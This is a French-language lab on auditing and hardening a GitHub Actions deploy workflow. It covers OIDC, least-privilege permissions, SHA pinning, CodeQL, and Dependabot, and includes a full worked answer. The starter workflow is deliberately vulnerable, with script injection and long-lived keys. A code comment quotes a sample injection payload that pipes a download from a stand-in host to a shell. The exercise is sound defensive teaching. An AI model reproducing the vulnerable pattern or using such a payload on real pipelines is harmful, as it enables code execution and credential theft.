# Lab 08 — Durcir un pipeline de déploiement

> **Outcome :** à la fin, tu sais **auditer** un workflow de déploiement vulnérable et le **durcir** — OIDC à la place des clés long terme, `GITHUB_TOKEN` au minimum, actions épinglées au SHA, scanning branché — sur un vrai dépôt GitHub.
> **Vrai outil :** GitHub Actions (workflows dans `.github/workflows/`), sur un dépôt GitHub réel — l'onglet Actions et l'onglet Security montrent le résultat en direct.
> **Feedback :** le coach valide en session — pas de test-runner auto-correcteur.
> **⚠️ Aucun vrai secret.** On n'écrit **que** des `${{ secrets.NOM }}` et des placeholders `<...>`. Aucune vraie clé ne doit apparaître (la push protection GitHub bloquerait `AKIA...` / `sk_live_...`).

---

## Énoncé

C'est un exercice **défensif**. On te donne un `deploy.yml` TribuZen qui « marche » mais que tout audit sécurité recalerait. **Ta mission : l'auditer, lister les failles, puis le réécrire durci.**

### Le pipeline vulnérable de départ

Crée `.github/workflows/deploy.yml` avec **exactement** ce contenu (le point de départ à durcir) :

```yaml
# .github/workflows/deploy.yml — VERSION VULNÉRABLE (à durcir)
name: Deploy
on:
  push:
    branches: [main]

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7
      - uses: tj-actions/changed-files@v44
      - name: Announce
        run: echo "Deploying PR ${{ github.event.head_commit.message }}"
      - name: Deploy to AWS
        env:
          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
        run: ./scripts/deploy.sh
```

### Cahier des charges du durcissement

1. **OIDC** — remplace les clés IAM long terme (`AWS_ACCESS_KEY_ID` / `AWS_SECRET_ACCESS_KEY`) par une authentification OIDC via `aws-actions/configure-aws-credentials`. Plus **aucun** secret cloud stocké.
2. **Permissions minimales** — déclare un plancher `permissions` read-only au niveau workflow, et n'accorde `id-token: write` **qu'au niveau du job** de déploiement.
3. **Environment** — fais tourner le déploiement dans l'environment `production` (frontière d'approbation + secrets dédiés).
4. **Action pinning** — épingle **chaque** `uses:` à un SHA complet, avec le tag en commentaire.
5. **Script injection** — corrige le step `Announce` : la donnée externe (`github.event.head_commit.message`) ne doit pas être interpolée dans le `run:`.
6. **Scanning** — ajoute un second workflow `security.yml` qui lance CodeQL (SAST) **et** dependency review sur chaque PR, avec permissions minimales par job.
7. **Dependabot** — ajoute `.github/dependabot.yml` qui met à jour npm **et** les actions (`github-actions`).

**Pas de gap-fill** — tu écris les fichiers complets à partir du starter vulnérable.

---

## Étapes (en friction)

1. **Audit d'abord** — avant de coder, écris (papier / commentaire) la **liste des failles** du `deploy.yml` de départ. Vise-en au moins 4. Nomme chacune (ex. « clés long terme », « tag mutable », « permissions absentes », « script injection »).
2. **OIDC** — remplace le step `Deploy to AWS` par un step `configure-aws-credentials` avec `role-to-assume`, `aws-region`, `role-session-name`. Supprime les deux secrets AWS.
3. **Permissions** — ajoute `permissions: contents: read` au niveau workflow, puis un bloc `permissions` **au niveau job** avec `id-token: write` + `contents: read`.
4. **Environment** — ajoute `environment: name: production` au job.
5. **Pinning** — pour chaque action, va chercher le SHA du tag (sur GitHub, page Releases / Tags de l'action → commit) et remplace `@v4` par `@<sha> # v4.x.x`. (En session, tu peux garder un SHA plausible : l'important est la **forme** SHA + commentaire.)
6. **Anti-injection** — réécris `Announce` pour passer `head_commit.message` par un `env:` puis l'afficher via `$VAR`.
7. **security.yml** — crée le workflow de scanning (CodeQL init/analyze + dependency-review-action), un job par scan, permissions déclarées par job (`security-events: write` **seulement** pour CodeQL).
8. **dependabot.yml** — crée le fichier avec les deux `package-ecosystem` (npm + github-actions).
9. **Vérifie** — pousse sur une branche, ouvre une PR : l'onglet Actions doit montrer les workflows verts ; relis ton `deploy.yml` en te demandant « quel secret cloud reste stocké ? » (réponse attendue : aucun).

---

## Corrigé complet commenté

**`.github/workflows/deploy.yml` — durci :**

```yaml
# .github/workflows/deploy.yml — VERSION DURCIE
name: Deploy
on:
  push:
    branches: [main]

# Plancher least privilege : lecture seule pour tout le workflow.
# On NE parie PAS sur le défaut read-only du repo — on le déclare.
permissions:
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest

    # Frontière de sécurité : approbation humaine + secrets dédiés à production.
    # La trust policy AWS n'autorisera le rôle que depuis cet environment (cours 12).
    environment:
      name: production
      url: https://app.tribuzen.fr

    # Override AU NIVEAU JOB : remplace (ne fusionne PAS) le plancher workflow.
    # id-token: write est requis pour demander le JWT OIDC. contents relisté = read.
    permissions:
      id-token: write
      contents: read

    steps:
      # Actions épinglées au SHA COMPLET (immuable) + tag en commentaire (lisible,
      # bumpable par Dependabot). Un tag @v4 serait mutable → réécrivable (tj-actions 2025).
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2

      - name: Configure AWS credentials (OIDC)
        uses: aws-actions/configure-aws-credentials@b47578312673ae6fa5b5096b330d9fbac3d116df # v6.2.1
        with:
          role-to-assume: arn:aws:iam::123456789012:role/tribuzen-deploy
          aws-region: eu-west-3
          role-session-name: tribuzen-deploy
          # AUCUNE access key / secret key : c'est tout l'intérêt de l'OIDC.

      # Anti script injection : la donnée externe passe par une variable d'ENV,
      # que le shell ne réévalue pas. Interpolée dans le run:, un message piégé
      # (ex. "$(curl evil|sh)") s'exécuterait.
      - name: Announce
        env:
          COMMIT_MSG: ${{ github.event.head_commit.message }}
        run: echo "Deploying: $COMMIT_MSG"

      - name: Deploy
        run: ./scripts/deploy.sh    # credentials temporaires déjà dans l'environnement
```

**`.github/workflows/security.yml` — scanning en PR :**

```yaml
# .github/workflows/security.yml
name: Security
on:
  pull_request:

# Plancher lecture seule pour tous les jobs.
permissions:
  contents: read

jobs:
  codeql:                            # SAST — analyse statique du code
    permissions:
      contents: read
      security-events: write         # requis UNIQUEMENT ici : CodeQL écrit ses alertes
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
      - uses: github/codeql-action/init@4e828ff8d448a8a6e532957b1811f387a63867e8 # v3.28.1
        with:
          languages: javascript-typescript
      - uses: github/codeql-action/analyze@4e828ff8d448a8a6e532957b1811f387a63867e8 # v3.28.1

  dependency-review:                 # SCA — dépendances vulnérables introduites par la PR
    permissions:
      contents: read                 # PAS de security-events : ce job n'en a pas besoin
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
      - uses: actions/dependency-review-action@3b139cfc5fae8b618d3eae3675e383bb1769c019 # v4.5.0
        with:
          fail-on-severity: high     # bloque la PR si dépendance high+ introduite
```

**`.github/dependabot.yml` — bumps automatiques :**

```yaml
version: 2
updates:
  - package-ecosystem: npm
    directory: "/"
    schedule:
      interval: weekly
  - package-ecosystem: github-actions   # met à jour les SHA épinglés ci-dessus + leur commentaire
    directory: "/"
    schedule:
      interval: weekly
```

**Pourquoi ce corrigé est correct :**
- **Zéro secret cloud stocké** : l'OIDC échange un JWT éphémère contre des credentials AWS temporaires. Les deux `secrets.AWS_*` ont disparu.
- **Least privilege** : plancher `contents: read` au workflow ; `id-token: write` uniquement dans le job qui en a besoin ; `security-events: write` uniquement pour CodeQL. Le bloc job **remplace** le plancher, donc `contents: read` est **relisté**.
- **Pinning** : chaque `uses:` pointe un SHA 40 caractères (immuable) ; le tag en commentaire garde la lisibilité et laisse Dependabot proposer les montées de version.
- **Anti-injection** : `head_commit.message` transite par `env:`, jamais interpolé dans le `run:`.
- **Deux angles de scan** : CodeQL (SAST) + dependency review (SCA), plus le secret scanning / push protection activés côté réglages repo (hors YAML).

---

## Variante J+30 (fading)

**Même objectif, contraintes ajoutées :**

Reprends un `deploy.yml` vulnérable **de mémoire, en 25 minutes**, avec ces ajouts :

1. Ajoute un **job `staging`** qui déploie sur l'environment `staging` depuis toute PR, et le job `production` **seulement** sur `main` (garde `if: github.ref == 'refs/heads/main'`). Chaque environment a **son propre** rôle OIDC (`role-to-assume` différent).
2. Le `role-session-name` doit inclure le numéro de run (`${{ github.run_id }}`) pour tracer chaque déploiement dans CloudTrail.
3. **Sans rouvrir ce corrigé** ni le module 08.

**Critère de réussite :** aucun secret cloud stocké, `id-token: write` présent **uniquement** dans les jobs de déploiement, toutes les actions épinglées au SHA, et le déploiement production impossible depuis une PR.

---

## Application TribuZen

Dans le repo `smaurier/tribuzen`, ces fichiers vivent ici :

```
tribuzen/
  .github/
    workflows/
      deploy.yml          ← OIDC + permissions job + pinning SHA
      security.yml        ← CodeQL + dependency review
    dependabot.yml        ← npm + github-actions
```

**Différences par rapport au lab :**

- Le **rôle IAM** `tribuzen-deploy` et sa **trust policy** (qui filtre le `sub` claim sur `environment:production`) sont provisionnés au **cours 12** — dans le lab, on suppose le rôle déjà créé.
- La **sécurité applicative** (auth, validation, OWASP) est le **cours 14** — ici on ne sécurise que le **pipeline**.
- **secret scanning + push protection** s'activent dans Settings → Code security du repo réel (pas dans le YAML).

**Commit cible :**
```
chore(ci): durcir deploy.yml — OIDC, GITHUB_TOKEN minimal, actions pinned SHA, scanning
```
